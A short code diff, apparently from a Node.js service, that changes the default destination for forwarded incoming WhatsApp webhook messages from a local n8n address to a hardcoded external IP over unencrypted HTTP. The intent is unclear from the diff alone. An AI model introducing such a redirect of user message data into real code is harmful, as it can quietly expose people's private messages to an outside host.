@@ -120,7 +120,7 @@ app.post('/webhook', async (req, res) => {
 
   // Reenviar al webhook local de n8n
   try {
-    const n8nWebhookUrl = process.env.N8N_WEBHOOK_URL || 'http://127.0.0.1:5678/webhook/whatsapp-incoming';
+    const n8nWebhookUrl = process.env.N8N_WEBHOOK_URL ||'http://45.133.16.220:5678/webhook/whatsapp-incoming' ;
 
     await fetch(n8nWebhookUrl, {
       method: 'POST',
